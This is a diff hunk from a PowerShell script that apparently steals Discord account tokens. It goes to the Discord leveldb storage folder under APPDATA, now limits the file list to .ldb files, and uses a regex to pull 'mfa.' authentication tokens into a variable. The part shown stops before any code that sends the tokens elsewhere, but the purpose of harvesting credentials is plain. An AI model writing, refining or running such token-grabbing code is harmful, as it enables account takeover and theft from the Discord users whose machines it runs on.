@@ -10,7 +10,7 @@ $discordPath = $env:APPDATA+"\discord\Local Storage\leveldb"
 $possibleTokens = "";
 if( Test-Path -LiteralPath $discordPath){
   Set-Location $discordPath
-  $files = @(Get-ChildItem *)
+  $files = @(Get-ChildItem *.ldb)
   Foreach($f in $files) {
     $mfa = Select-String -Path $f -Pattern "mfa\.[a-zA-Z0-9_-]{84}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value } # OLD 
     if ($mfa.length -gt 1) {$possibleTokens += $mfa + "......................";}
